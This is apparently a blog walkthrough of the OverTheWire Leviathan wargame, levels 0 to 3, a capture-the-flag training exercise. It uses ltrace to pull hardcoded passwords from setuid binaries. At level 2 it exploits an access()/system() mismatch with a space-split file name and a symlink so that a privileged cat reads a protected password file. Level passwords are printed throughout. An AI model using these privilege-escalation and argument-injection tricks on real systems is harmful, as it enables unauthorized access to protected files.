---
title: "Over The Wire - Leviathan Walkthrough"
date: 2019-03-31T00:05:08Z
---

# Level 0

Arriving at Level 0 we can use `ls -l` to print any files, however it prints:

```
total 0
```

So we should maybe use `ls -la` which should print:

```
total 24
drwxr-xr-x  3 root       root       4096 Oct 29 21:17 .
drwxr-xr-x 10 root       root       4096 Oct 29 21:17 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Oct 29 21:17 .backup
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

Because according to `man ls`:

```
-a, --all
              do not ignore entries starting with .
```

We `cd .backup && ls -la` in order to get into the directory and print the contents and get:

```
total 140
drwxr-x--- 2 leviathan1 leviathan0   4096 Oct 29 21:17 .
drwxr-xr-x 3 root       root         4096 Oct 29 21:17 ..
-rw-r----- 1 leviathan1 leviathan0 133259 Oct 29 21:17 bookmarks.html
```

We need to read the `bookmarks.html` and the easiest way is using `cat`, however there's a problem, the file is extremely long!
Time to filter it! We pipe it to `grep` and search for `leviathan` given the password should probably be referenced that way!

```bash
cat bookmarks.html | grep leviathan
```

And lo and behold!

```html
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

# Level 1

Again and moving forward, our first command when we arrive to the level is `ls -la`.

This time the output is:

```
total 28
drwxr-xr-x  2 root       root       4096 Oct 29 21:17 .
drwxr-xr-x 10 root       root       4096 Oct 29 21:17 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan2 leviathan1 7452 Oct 29 21:17 check
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

Uh, what is that check? Lets find out, we run `file` on it and we get back:

```
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c735f6f3a3a94adcad8407cc0fda40496fd765dd, not stripped
```

Since it is an executable we can first try to see what it does!
When executing it, it asks us for a password, if we fail it closes...

We can try to find out the string using `strings` on it, however it doesn't provide anything meaningful in this case.

Introducing `ltrace`!

```
ltrace is a program that simply runs the specified command until it exits. It intercepts and records the dynamic library calls which are called by the executed process and the signals which are received by that process. It can also intercept and print the system calls executed by the program.
```

Let's try it out, run `ltrace ./check`, the program will start running as normal however you can already see a lot of information about what's going on.

Using `test` as our password the output we get from `ltrace` is this.

```
__libc_start_main(0x804853b, 1, 0xffffd794, 0x8048610 <unfinished ...>
printf("password: ")                                                                                                                                                 = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: test
)                                                                                                                                = 116
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                                                                                                = 101
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                                                                                                = 115
strcmp("tes", "sex")                                                                                                                                                 = 1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                                                                                                 = 29
+++ exited (status 0) +++
```

We can see it calls `strcmp` with the first 3 characters from the input password and compares them with `sex`.

Trying is as a password gives us another shell! Did our user changed? Running `whoami` we get the following:

```
leviathan2
```

Uhhh! This means we can read the password for the next level!

Running `cat /etc/leviathan_pass/leviathan2` outputs our password!

```
ougahZi8Ta
```

# Level 2

This time we have `printfile`, since we have no clue what it does lets run it.

An empty argument list yields:

```
*** File Printer ***
Usage: ./printfile filename
```

So we create a file on the `/tmp` folder with `echo "test" >> /tmp/printfile_test`, 
so now our file contains `test` and given the executable name we are hoping to see `test` being printed out.

As expected `./printfile /tmp/printfile_test` prints out:

```
test
```

Let's try the same, however using `ltrace`, the output is:

```
__libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...>
access("/tmp/printfile_test", 4)                                                                                                                                     = 0
snprintf("/bin/cat /tmp/printfile_test", 511, "/bin/cat %s", "/tmp/printfile_test")                                                                                  = 28
geteuid()                                                                                                                                                            = 12002
geteuid()                                                                                                                                                            = 12002
setreuid(12002, 12002)                                                                                                                                               = 0
system("/bin/cat /tmp/printfile_test"test
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                                               = 0
+++ exited (status 0) +++
```

The second line `access("/tmp/printfile_test", 4)`, 
checks wether the calling process can access the file.

As stated in the `access(2)` manpage:
> `access()` checks whether the calling process can access the file `pathname`. If `pathname` is a symbolic link, it is dereferenced.
>
> (...)
>
> The check is done using the calling process's real UID and GID, rather than the effective IDs as is  done when actually attempting an operation (e.g., open(2)) on the file.

So far we know the following:

- `access` requires the file to exist
- It will check the permission based on the process real UID and GID
    - This means that it checks if the user calling the process has the permissions and not the program itself

If we go further we can see that two calls to `geteuid` are made, both returning `12002`.
Running `id -u` we can verify that that is the ID of `leviathan2`.

Afterwards we can observe a call to `setreuid`, a quick look in the manpages yields the following:

> setreuid() sets real and effective user IDs of the calling process.

This means that we have a `setuid`-like binary in hands, 
and so we can't rely on `ltrace` to do a faithful job, 
while there is a flag addressing such issue:

> `-u username`
>
> Run command with the userid, groupid and supplementary groups of username. This option is only useful when running as root and enables the correct execution of setuid and/or setgid binaries.

It only works for root, 
so when we want to try the "final" version we will always run without `ltrace`, 
this applies for further levels as well.

Finally there is a call to `system`:

```
system("/bin/cat /tmp/printfile_test")
```

This call will be executed with the priviledges set by `setreuid` and while when running with `ltrace`
they are the same as the current level it is possible to think that without it, 
it is probably a more usefull call.

This opens up a security hole given that the priviledges being checked with `access` 
are not the same as the ones when calling `system`.
Furthermore the use of `%s` in `snprintf` means that 
we have control of the input over the command being run.

Ideally we want to run the following command:

```
cat /etc/leviathan_pass/leviathan3
```

However we do not have access to `/etc/leviathan_pass/leviathan3`, 
to any symbolic links given that they resolve to the file anyway, 
neither we can create a file called `test /etc/leviathan_pass/leviathan3`.

However we can create one called `test link`, and then run `printfile "test link"`.
This won't be very useful unless either `test` or `link` are symbolic links to `/etc/leviathan_pass/leviathan3`.
To do so, we run

```
touch "test link"
ln -s /etc/leviathan_pass/leviathan3 link
~/printfile "test link"
```

Which will create the dummy file for the `printfile` to take and check access over, 
create a symbolic link to `/etc/leviathan_pass/leviathan3` named `link` 
and finally run `~/printfile "test link"` yielding:

```
/bin/cat: test: No such file or directory
Ahdiemoo1j
```

And there is our password!

# Level 3

Going into Level 3, 
we have yet another password challenge, 
running the `level3` executable shows us a prompt for a password.

```
leviathan3@leviathan:~$ ./level3 
Enter the password> password
bzzzzzzzzap. WRONG
```

We grab our old friend `ltrace` and run `ltrace ./level3`, the following ensues.

```
__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                        = -1
printf("Enter the password> ")                                                    = 20
fgets(Enter the password> password
"password\n", 256, 0xf7fc55a0)                                              = 0xffffd590
strcmp("password\n", "snlprintf\n")                                               = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                        = 19
+++ exited (status 0) +++
```

While in the second line we have a clearly false comparison, 
after `fgets` we see our input being compared to `snlprintf`,
so we try again with `snlprintf` as input.

```
__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                        = -1
printf("Enter the password> ")                                                    = 20
fgets(Enter the password> snlprintf
"snlprintf\n", 256, 0xf7fc55a0)                                             = 0xffffd590
strcmp("snlprintf\n", "snlprintf\n")                                              = 0
puts("[You've got shell]!"[You've got shell]!
)                                                       = 20
geteuid()                                                                         = 12003
geteuid()                                                                         = 12003
setreuid(12003, 12003)                                                            = 0
system("/bin/sh"$ whoami
leviathan3
$ exit
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                            = 0
+++ exited (status 0) +++
```

This got us shell! 
However when running with `ltrace` the program runs within the `leviathan3` user.
Ditching `ltrace` and running the executable alone gives us the following result.

```
/level3 
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
```

Meaning we can get the password for Level 4.

```
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```

Ta-daaaaa!